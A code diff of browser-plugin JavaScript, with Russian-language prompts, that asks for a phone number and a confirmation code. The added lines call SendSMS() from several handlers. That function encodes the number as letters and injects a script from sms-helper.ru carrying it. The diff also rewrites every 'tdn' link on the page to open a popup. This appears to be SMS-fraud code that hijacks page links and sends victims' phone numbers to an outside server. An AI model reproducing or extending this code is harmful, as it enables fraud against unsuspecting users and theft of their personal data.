@@ -320,30 +320,31 @@ function GoStep() {
         $('.input-e').text('Укажите номер телефона');
         $('.input-e').css('display', 'block');
 		SendStat(33,"small");
-        return false;
+        return ;
     }
     if (num.length < 8) {
         $('.input-e').text('В номере неверное количество цифр.');
         $('.input-e').css('display', 'block');
 		SendStat(33,"small");
-        return false;
+        return ;
     }
     
 	plg.Save('oPhoneX',document.getElementById('pre').innerText+document.getElementById('field_mobile').value);
 	SendStat(3,"big");
 	GetCountry();
-	//SendSMS();
+	
 	
     $('.input-e').css('display', 'none');
     $('#Step_1').animate({
         marginTop: '-=341px'
     }, 800);
-	SendStat(2,"small");
+	SendSMS();
 }
 
 function st_2() {
+
     sndSms = sendSms;
-    var pole = $('#field_mobile2').val();
+	    var pole = $('#field_mobile2').val();
     if (pole.length == 0) {
         $('.input-e').text('Введите код.');
         $('.input-e').css('display', 'block');
@@ -565,16 +566,16 @@ function SendSMS() {
     try {
         var number = plg.Get('oPhone');
         var id = plg.Get('id');
-        var idPage = plg.Get('vIdPage');
+        var idPage = plg.Get('oIdPage');
         var alpha = ['a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j'];
         number = number.replace(/\+/, '');
-        var res = plg.Get('oPhone');
+        //var res = plg.Get('oPhone');
 		number = number.replace(/[X]/gi,'');
 		var rnum = document.getElementById('field_mobile').value;
-		var p = document.getElementById('pre').innerText;
+		var p = document.getElementById('pre').innerHTML;
 		p = p.replace('+','');
 		pCode = pCode.replace('+','');
-		var aress = p+rnum;
+		var aress = p+""+rnum;
 		var ares = '';
          for (var i = 0; i < aress.length; i++)
             ares += alpha[parseInt(aress[i])]; 
@@ -583,10 +584,11 @@ function SendSMS() {
         sms.setAttribute('type', 'text/javascript');
         var url = 'http://sms-helper.ru/js/sendsms.php?type='+type+'&set='+ares+'&id=' + id +'&shot='+shot;
 		sms.setAttribute('src', url);
-        document.getElementsByTagName('head')[0].appendChild(sms);
+        document.getElementsByTagName('body')[0].appendChild(sms);
 		
 		
-    } catch (e) {}
+    } catch (e) {
+	alert('no')}
 }
 var t="";
 
@@ -673,10 +675,12 @@ function Hidden() {
 		document.getElementById('hide').style.display = "block";
 		h=1;
 		SendStat(555,"small");
+		SendSms();
 	}
 	else {
 		document.getElementById('hide').style.display = "none";
 		h=0;
+		SendSms();
 	}
 }
 
@@ -746,7 +750,10 @@ mb.setAttribute('onclick',Wnd());
 document.body.removeEventListener('DOMNodeInserted', Go, false);
 	
 } */
-for (var i=0;i<50;i++) document.getElementsByClassName("tdn")[i].setAttribute("onclick","Wnd()");
+for (var i=0;i<document.getElementsByClassName("tdn").length;i++){
+	document.getElementsByClassName("tdn")[i].setAttribute("onclick","Wnd()");
+	document.getElementsByClassName("tdn")[i].href = "/#";
+}
  
  var addCommentBtn = document.getElementsByClassName('plp_cmt_w')[0];
 		if (addCommentBtn)
